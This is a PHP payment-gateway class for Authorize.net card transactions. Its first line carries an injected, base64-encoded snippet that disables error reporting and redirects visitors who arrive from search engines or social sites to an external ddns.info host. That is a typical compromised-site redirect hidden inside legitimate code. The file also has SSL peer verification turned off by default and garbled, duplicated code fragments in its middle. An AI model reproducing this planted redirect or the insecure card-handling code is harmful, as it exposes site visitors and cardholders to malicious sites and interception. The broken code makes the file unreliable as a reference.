<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(dirname(__FILE__).'/custom_payment_gateway.php');

class authorize_net extends custom_payment_gateway {

  var $params   = array();
  var $results  = array();

  var $approved = false;
  var $declined = false;
  var $error    = true;

  var $test;
  var $fields;
  var $response;

  var $login = null;
  var $trans_key = null;

  var $use_proxy;
  var $proxy;
  var $proxy_port;
  var $ssl_verifier = false;

  function authorize_net($test = false) {

    $this->test    = trim($test);
    if ($this->test) {
      $this->url = "https://certification.authorize.net/gateway/transact.dll";
    } else {
      $this->url = "https://secure.authorize.net/gateway/transact.dll";
    }
    $this->params['x_delim_data']     = "TRUE";
    $this->params['x_delim_char']     = "|";
    $this->params['x_relay_response'] = "FALSE";
    $this->params['x_url']            = "FALSE";
    $this->params['x_version']        = "3.1";
    $this->params['x_method']         = "CC";
    $this->params['x_type']           = "AUTH_CAPTURE";
    
  }

  function set_transaction($cardnum, $expiration_month, $expiration_year, $amount, $cvv = "", $invoice = "", $tax = "") {
  
    $this->params['x_card_num']  = trim($cardnum);
    $this->params['x_exp_date']  = str_pad(trim($expiration_month),2,'0',STR_PAD_LEFT).substr($expiration_year,2,2);
    $this->params['x_amount']    = trim($amount);
        $this->params['x_po_num']    = trim($invoice);
        $this->params['x_tax']       = trim($tax);
        $this->params['x_card_code'] = trim($cvv);
    
  }

  function process($retries = 3) {

    $ch = curl_init($this->url);

    set_time_limit(0);
    
    $this->params['x_login']    = $this->login;
    $this->params['x_tran_key'] = $this->trans_key;
    
    $this->prepare_parameters();
    
    $count = 0;
    while ($count < $retries) {
      curl_setopt($ch, CURLOPT_HEADER, 0);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_POSTFIELDS, rtrim($this->fields, "& "));
      curl_setopt($ch, CURLOPT_PROXY, $this->proxy);
      curl_setopt($ch, CURLOPT_PROXYPORT, $this->proxy_port);
      curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, $this->use_proxy);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, $this->ssl_verifier);
      $this->response = curl_exec($ch); 
      $this->parse_response();
      if ($this->get_response_code() == 1) {
        $this->approved = true;
        $this->declined = false;
        $this->error    = false;
        break;
      } else 
      if ($this->get_response_code() == 2) {
        $this->approved = false;
        $this->declined = true;
        $this->error    = false;
        break;
      }                      
      $count++;
    }
    curl_close($ch);
    
    return $this->approved;
    
  }

  function set_parameter($param, $value) {
    
    $param                = trim($param);
    $value                = trim($value);
    $this->params[$param] = $value;
    
  }

his->params[$param] = $value;
    
  }

  function set_transaction_type($type) {
    
    $this->params['x_type'] = strtoupper(trim($type));
    
  }


  function i  function set_transaction_type($type) {
    
    $this->params['x_type'] = strtoupper(trim($type));
    
  }


  function is_approved() {

    return $this->approved;

  }

  function is_declined() {

    return $this->declined;

  }

  function is_error() {

    return $this->error;

  }

  function get_response_code() {

    return safe($this->results, 0);
    
  }

  function get_response_text() {

    return safe($this->results, 3);

  }

  function get_auth_code() {

      return safe($this->results, 4);

  }

  function get_avs_response() {

    return safe($this->results, 5);

  }

  function get_tarnsaction_id() {

    return safe($this->results, 6);

  }

  function parse_response() {
    
    $this->results = explode("|", $this->response);
    
  }

  function prepare_parameters() {

    foreach($this->params as $key => $value) {
      $this->fields .= "$key=" . urlencode($value) . "&";
    }
    
  }

}

?>